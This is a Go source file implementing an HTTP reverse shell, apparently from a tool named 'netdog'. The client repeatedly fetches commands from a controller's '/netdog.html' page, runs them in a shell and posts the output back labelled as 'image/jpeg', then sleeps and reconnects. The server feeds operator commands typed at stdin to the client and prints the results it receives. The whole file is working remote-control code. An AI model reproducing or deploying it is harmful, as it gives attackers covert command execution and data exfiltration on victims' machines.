package main

import (
	"bufio"
	"bytes"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"strings"
	"time"
)

func AsyncHTTPClient(config Config) {
	url := config.Scheme + "://" + config.Address

	resp, err := http.Get(url + "/netdog.html")
	if err != nil {
		AsyncHTTPReconnect(config)
		return
	}

	body, _ := io.ReadAll(resp.Body)
	output := RCE(config.Shell, body)

	_, _ = http.Post(url, "image/jpeg", bytes.NewBuffer(output))

	resp.Body.Close()
	AsyncHTTPReconnect(config)
}

func AsyncHTTPServer(config Config) {
	reader := bufio.NewReader(os.Stdin)

	listener, err := net.Listen("tcp", config.Address)
	if err != nil {
		log.Fatalln(err)
	}
	defer listener.Close()
	log.Println("Listening on " + config.Address)

	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Println(err)
		}

		buffer := make([]byte, MAXBUFFERSIZE)
		conn.Read(buffer)

		httpReq := string(buffer)
		if strings.HasPrefix(httpReq, "POST") {
			fmt.Println(httpReq)
			conn.Close()
			continue
		}

		fmt.Print("> ")
		command, _ := reader.ReadString('\n')
		response := "HTTP/1.1 200 OK\nContent-Type: text/plain\n\n" + command

		conn.Write([]byte(response))

		conn.Close()
	}
}

func AsyncHTTPReconnect(config Config) {
	time.Sleep(config.Reconnect)
	AsyncHTTPClient(config)
}
